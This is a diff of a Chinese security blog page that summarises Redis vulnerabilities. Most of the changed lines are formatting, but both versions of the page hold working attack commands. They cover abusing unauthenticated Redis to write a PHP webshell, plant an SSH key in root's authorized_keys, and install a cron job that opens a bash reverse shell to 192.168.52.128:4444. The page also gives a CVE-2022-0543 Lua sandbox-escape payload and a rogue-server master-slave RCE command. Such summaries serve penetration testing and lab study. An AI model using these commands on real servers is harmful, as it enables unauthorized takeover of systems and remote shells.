@@ -16,12 +16,12 @@
   <meta name="author" content="D4wn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Redis漏洞总结  常见命令注：redis不区分大小写 1234keys * 获取数据库中所有的键save 进行一次备份操作flushall 清除所有数据del key 删除数据  配置文件安全模式起作用需要同时满足两个条件：  redis没有开启登录认证 redis没有绑定ip  redis默认是未开启认证，开启安全模式的 未授权访问应用条件 bind 127.0.0.1 处于注释状态 pro">
+    <meta name="description" content="Redis漏洞总结  常见命令 注：redis不区分大小写 1234keys * 获取数据库中所有的键save 进行一次备份操作flushall 清除所有数据del key 删除数据 配置文件 安全模式起作用需要同时满足两个条件：  redis没有开启登录认证 redis没有绑定ip  redis默认是未开启认证，开启安全模式的 未授权访问应用条件  bind 127.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Redis漏洞总结">
 <meta property="og:url" content="https://d4wnnn.github.io/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="Redis漏洞总结  常见命令注：redis不区分大小写 1234keys * 获取数据库中所有的键save 进行一次备份操作flushall 清除所有数据del key 删除数据  配置文件安全模式起作用需要同时满足两个条件：  redis没有开启登录认证 redis没有绑定ip  redis默认是未开启认证，开启安全模式的 未授权访问应用条件 bind 127.0.0.1 处于注释状态 pro">
+<meta property="og:description" content="Redis漏洞总结  常见命令 注：redis不区分大小写 1234keys * 获取数据库中所有的键save 进行一次备份操作flushall 清除所有数据del key 删除数据 配置文件 安全模式起作用需要同时满足两个条件：  redis没有开启登录认证 redis没有绑定ip  redis默认是未开启认证，开启安全模式的 未授权访问应用条件  bind 127.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://source.unsplash.com/user/erondu/1600x900">
 <meta property="article:published_time" content="2022-12-28T16:41:33.000Z">
@@ -117,7 +117,123 @@
 
 
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
 
 
 <body>
@@ -259,7 +375,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          2k 字
         
       </span>
     
@@ -270,7 +386,7 @@
         
         
         
-          18 分钟
+          17 分钟
         
       </span>
     
@@ -313,55 +429,72 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Redis漏洞总结"><a href="#Redis漏洞总结" class="headerlink" title="Redis漏洞总结"></a>Redis漏洞总结</h1><img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;">
-
-<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><p>注：redis不区分大小写</p>
+                <h1 id="redis漏洞总结">Redis漏洞总结</h1>
+<p><img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;"></p>
+<h2 id="常见命令">常见命令</h2>
+<p>注：redis不区分大小写</p>
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">keys * 获取数据库中所有的键<br><span class="hljs-built_in">save</span> 进行一次备份操作<br>flushall 清除所有数据<br><span class="hljs-built_in">del</span> <span class="hljs-built_in">key</span> 删除数据<br></code></pre></td></tr></table></figure>
-
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>安全模式起作用需要同时满足两个条件：</p>
+<h2 id="配置文件">配置文件</h2>
+<p>安全模式起作用需要同时满足两个条件：</p>
 <ul>
 <li>redis没有开启登录认证</li>
 <li>redis没有绑定ip</li>
 </ul>
 <p>redis默认是未开启认证，开启安全模式的</p>
-<h2 id="未授权访问应用条件"><a href="#未授权访问应用条件" class="headerlink" title="未授权访问应用条件"></a>未授权访问应用条件</h2><ol>
+<h2 id="未授权访问应用条件">未授权访问应用条件</h2>
+<ol type="1">
 <li>bind 127.0.0.1 处于注释状态</li>
 <li>protected-mode no</li>
 <li>requirepass 处于注释状态</li>
 </ol>
-<h2 id="写Webshell"><a href="#写Webshell" class="headerlink" title="写Webshell"></a>写Webshell</h2><p>应用条件：知道Web目录，并且可读写</p>
-<figure class="highlight plaintext"><figcaption><span>set dir</span><a href="/tmp">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs config">config set dir /var/www/html<br>config set dbfilename 1.php<br>set test &quot;&lt;?php phpinfo();?&gt;&quot;<br>bgsave # 保存执行<br>save # 保存执行<br>注意:部分目录没有读写权限<br></code></pre></td></tr></table></figure>
-
-<h2 id="写入RSA秘钥"><a href="#写入RSA秘钥" class="headerlink" title="写入RSA秘钥"></a>写入RSA秘钥</h2><p>前提条件</p>
+<h2 id="写webshell">写Webshell</h2>
+<p>应用条件：知道Web目录，并且可读写</p>
+<figure class="highlight plaintext"><figcaption><span>set dir</span><a href="/tmp">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs config">config set dir /var/www/html<br>config set dbfilename 1.php<br>set test "&lt;?php phpinfo();?&gt;"<br>bgsave # 保存执行<br>save # 保存执行<br>注意:部分目录没有读写权限<br></code></pre></td></tr></table></figure>
+<h2 id="写入rsa秘钥">写入RSA秘钥</h2>
+<p>前提条件</p>
 <ul>
 <li>redis以root账号启动</li>
 <li>服务器必须允许密钥登陆</li>
 <li>protected-mode处于关闭状态</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh/<br>config set dbfilename authorized_keys<br>set x &quot;\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdPp3/tfIlmHhVKuaR5Ckd0uuv98Q6AusZP9ZJrrb8aRWniTNCdUvV7gfW5ctZxROXfUF+tvnd6So8MwR70AwNqaCsWrsUBPzJXcR1Zl89M1G9KulUOgF3rANKQ8dqZivouvs1DcqkyqWi1652tAQ+4xS8i/mhFeS0dxjajttcrzmirF9DPzlsKTzfbMpUYupRAOl7GikdB9dhPzH3xQ4Oem4UMeZbznPuT861msmNLByh3ni+szdrF8yqwbPkVSDDbUlFCppF9N+Fykra5Uuc/tkXZaxgAjBWdpeFsLnMPlBWKoN1BJpzwZHgG2iKLT7PJS5bqx+RdkD7XJy9eqXL root@mail.test.com \n\n\n&quot;<br>或者<br>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt<br>cat foo.txt | redis-cli -h x.x.x.x -x set crackit<br>save<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="写定时任务反弹shell"><a href="#写定时任务反弹shell" class="headerlink" title="写定时任务反弹shell"></a>写定时任务反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron<br>config set dbfilename root #必须是root<br>set xx  &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n&quot;<br>save<br></code></pre></td></tr></table></figure>
-
-<h2 id="CVE-2022-0543-沙箱绕过"><a href="#CVE-2022-0543-沙箱绕过" class="headerlink" title="CVE-2022-0543-沙箱绕过"></a>CVE-2022-0543-沙箱绕过</h2><p>攻击机:172.30.152.248</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh/<br>config set dbfilename authorized_keys<br>set x "\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdPp3/tfIlmHhVKuaR5Ckd0uuv98Q6AusZP9ZJrrb8aRWniTNCdUvV7gfW5ctZxROXfUF+tvnd6So8MwR70AwNqaCsWrsUBPzJXcR1Zl89M1G9KulUOgF3rANKQ8dqZivouvs1DcqkyqWi1652tAQ+4xS8i/mhFeS0dxjajttcrzmirF9DPzlsKTzfbMpUYupRAOl7GikdB9dhPzH3xQ4Oem4UMeZbznPuT861msmNLByh3ni+szdrF8yqwbPkVSDDbUlFCppF9N+Fykra5Uuc/tkXZaxgAjBWdpeFsLnMPlBWKoN1BJpzwZHgG2iKLT7PJS5bqx+RdkD7XJy9eqXL root@mail.test.com \n\n\n"<br>或者<br>(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt<br>cat foo.txt | redis-cli -h x.x.x.x -x set crackit<br>save<br></code></pre></td></tr></table></figure>
+<h2 id="写定时任务反弹shell">写定时任务反弹shell</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron<br>config set dbfilename root #必须是root<br>set xx  "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"<br>save<br></code></pre></td></tr></table></figure>
+<h2 id="cve-2022-0543-沙箱绕过">CVE-2022-0543-沙箱绕过</h2>
+<p>攻击机:172.30.152.248</p>
 <p>靶机:172.30.158.168</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.2 &lt;&#x3D; redis &lt; 5.0.13<br>2.2 &lt;&#x3D; redis &lt; 6.0.15<br>2.2 &lt;&#x3D; redis &lt; 6.2.5</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0<br></code></pre></td></tr></table></figure>
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703"></p>
-<p><img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237"></p>
-<h2 id="RCE-主从复制getshell"><a href="#RCE-主从复制getshell" class="headerlink" title="RCE-主从复制getshell"></a>RCE-主从复制getshell</h2><p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
-<h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="影响版本">影响版本</h3>
+<p>2.2 &lt;= redis &lt; 5.0.13 2.2 &lt;= redis &lt; 6.0.15 2.2 &lt;=
+redis &lt; 6.2.5</p>
+<h3 id="exp">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0<br></code></pre></td></tr></table></figure>
+<h3 id="复现">复现</h3>
+<figure>
+<img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703">
+<figcaption aria-hidden="true">image-20221003110605703</figcaption>
+</figure>
+<figure>
+<img src="/2022/12/29/Redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237">
+<figcaption aria-hidden="true">image-20221003110613237</figcaption>
+</figure>
+<h2 id="rce-主从复制getshell">RCE-主从复制getshell</h2>
+<p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
+<h3 id="漏洞成因">漏洞成因</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="先决条件">先决条件：</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
 <p>root权限启动redis</p>
 <p>自动化脚本：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>https://github.com/n0b0dyCN/redis-rogue-server</p>
 <p><code>python redis-rogue-server.py --rhost 192.168.52.251 --lhost 192.168.52.128</code></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结 - T00ls.Com</a></p>
-<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83">https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/303910.html">https://www.freebuf.com/articles/web/303910.html</a></p>
+<h2 id="参考链接">参考链接</h2>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结
+- T00ls.Com</a></p>
+<p>https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</p>
+<p>https://www.freebuf.com/articles/web/303910.html</p>
 </blockquote>
 
                 
@@ -621,6 +754,11 @@
   
   
   
+  <!-- 又拍云 -->
+  <div>
+    <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">本网站由
+        <img src="img/又拍云_logo5.png" srcset="/img/loading.gif" lazyload width="45px" /> 提供CDN加速/云存储服务</a>
+ </div>
 </div>
 
   </footer>
